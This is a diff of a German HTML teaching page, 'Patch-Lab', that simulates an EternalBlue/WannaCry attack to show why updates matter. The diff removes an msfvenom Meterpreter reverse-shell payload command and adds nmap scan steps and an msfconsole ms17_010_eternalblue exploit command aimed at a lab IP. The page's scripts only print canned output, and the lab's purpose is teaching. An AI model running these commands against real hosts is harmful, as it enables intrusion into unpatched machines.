@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Patch-Lab</title>
+    <title>Patch-Lab: Blue und WannaCry</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -50,59 +50,57 @@
         .hidden {
             display: none;
         }
-        .input-section {
-            margin-top: 20px;
-        }
-        .input-section input {
-            width: calc(100% - 30px);
+        pre {
+            background: #f4f4f4;
             padding: 10px;
-            font-family: monospace;
-            font-size: 16px;
-            margin-bottom: 10px;
+            border-left: 4px solid #007bff;
+            color: #333;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Patch-Lab: Warum Updates wichtig sind</h1>
+        <h1>Patch-Lab: Blue und WannaCry</h1>
         <p>
-            In diesem Lab lernst du, wie Exploits gegen ungepatchte Systeme funktionieren. Ziel ist es, 
-            ein ungepatchtes System zu finden und einen Exploit zu simulieren. Nutze die folgenden Werte:
+            Im Jahr 2017 wurde durch eine Schwachstelle im SMBv1-Protokoll ein Exploit namens <strong>EternalBlue</strong> bekannt. 
+            Dieser wurde von der Ransomware <strong>WannaCry</strong> ausgenutzt, um Millionen ungepatchter Systeme weltweit anzugreifen. 
+            Durch regelmäßige Sicherheitsupdates hätte dieser Angriff verhindert werden können.
         </p>
-        <pre style="background: #f4f4f4; padding: 10px; border-left: 4px solid #007bff; color: #333;">
-LHOST=192.168.1.100
-RHOST=192.168.1.20
-        </pre>
-        <p>
-            Nach dem Netzwerkscan identifizierst du potenzielle Ziele. Gib den richtigen Exploit-Befehl ein, 
-            um eine Meterpreter-Session zu simulieren und die Flag zu erhalten. Der richtige Befehl lautet:
-        </p>
-        <pre style="background: #f4f4f4; padding: 10px; border-left: 4px solid #007bff; color: #333;">
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] RHOST=[RHOST] LPORT=4444 R > payload.exe
-        </pre>
 
-        <!-- Schritt 1: Netzwerkscan -->
+        <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
+        <p>
+            Führe mit dem Befehl <code>nmap -sV [IP]</code> einen Netzwerkscan durch, um offene Ports und Dienste zu finden. 
+            Scanne beide IP-Adressen und finde heraus, welche angreifbar ist.
+        </p>
+        <pre>
+LHOST=192.168.1.100
+RHOST1=192.168.1.10
+RHOST2=192.168.1.20
+        </pre>
         <div id="step-1" class="step">
-            <h2>Schritt 1: Netzwerkscan</h2>
-            <p>Klicke auf den Button, um einen Netzwerkscan mit <code>nmap</code> zu simulieren.</p>
-            <button class="btn" onclick="startScan()">Netzwerkscan starten</button>
+            <button class="btn" onclick="scanIP('RHOST1')">Scan für RHOST1 starten</button>
+            <button class="btn" onclick="scanIP('RHOST2')">Scan für RHOST2 starten</button>
             <div class="console" id="console-1"></div>
         </div>
 
-        <!-- Schritt 2: Exploit vorbereiten -->
-        <div id="step-2" class="step hidden">
+        <div id="step-2" class="hidden">
             <h2>Schritt 2: Exploit vorbereiten</h2>
-            <p>Gib den Exploit-Befehl ein, um das ungepatchte System anzugreifen.</p>
-            <div class="input-section">
-                <input type="text" id="exploit-command" placeholder="Befehl eingeben...">
-                <button class="btn" onclick="checkExploit()">Exploit ausführen</button>
-            </div>
+            <p>
+                Jetzt greifen wir das anfällige System mit einem Exploit an. Nutze den folgenden Befehl, um eine Verbindung zum Zielsystem herzustellen:
+            </p>
+            <pre>
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [Angreifbares Ziel]; run"
+            </pre>
+            <button class="btn" onclick="runExploit()">Exploit ausführen</button>
             <div class="console" id="console-2"></div>
         </div>
 
-        <!-- Schritt 3: Meterpreter-Session -->
         <div id="step-3" class="hidden">
-            <h2>Meterpreter-Session</h2>
+            <h2>Schritt 3: Reverse Shell und Zugang</h2>
+            <p>
+                Nach erfolgreichem Angriff haben wir Zugriff auf das System. Dies geschieht über eine sogenannte <strong>Reverse Shell</strong>, 
+                bei der sich das Zielsystem mit unserem angreifenden Computer verbindet. Dies ermöglicht es, Befehle auf dem Zielsystem auszuführen.
+            </p>
             <div class="console">
                 <p>meterpreter > sysinfo</p>
                 <p>Computer Name: Victim-PC</p>
@@ -117,39 +115,37 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LHOST] RHOST=[RHOST] LPORT=44
     </div>
 
     <script>
-        function startScan() {
+        function scanIP(target) {
             const console1 = document.getElementById("console-1");
-            console1.innerHTML = "Starte Netzwerkscan mit nmap...\n";
+            console1.innerHTML += `Starte Scan für ${target}...\n`;
             setTimeout(() => {
-                console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht)\n";
-            }, 1000);
-            setTimeout(() => {
-                console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht)\n";
+                if (target === "RHOST1") {
+                    console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht, sicher)\n";
+                } else if (target === "RHOST2") {
+                    console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\n";
+                }
             }, 2000);
             setTimeout(() => {
-                console1.innerHTML += "\nPotenzielle Ziele gefunden. Weiter mit Schritt 2.";
-                document.getElementById("step-1").classList.add("hidden");
-                document.getElementById("step-2").classList.remove("hidden");
-            }, 5000);
+                if (target === "RHOST2") {
+                    document.getElementById("step-1").classList.add("hidden");
+                    document.getElementById("step-2").classList.remove("hidden");
+                }
+            }, 4000);
         }
 
-        function checkExploit() {
-            const input = document.getElementById("exploit-command").value.trim();
+        function runExploit() {
             const console2 = document.getElementById("console-2");
-            const expectedCommand = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 RHOST=192.168.1.20 LPORT=4444 R > payload.exe";
-
-            if (input === expectedCommand) {
-                console2.innerHTML = "Exploit wird ausgeführt...\n";
+            console2.innerHTML = "Starte Exploit...\n";
+            setTimeout(() => {
+                console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
                 setTimeout(() => {
-                    console2.innerHTML += "Schwachstelle ausgenutzt. Zugriff auf System erhalten.\n";
                     document.getElementById("step-2").classList.add("hidden");
                     document.getElementById("step-3").classList.remove("hidden");
-                }, 3000);
-            } else {
-                console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
-            }
+                }, 2000);
+            }, 3000);
         }
     </script>
 </body>
 </html>
+
 
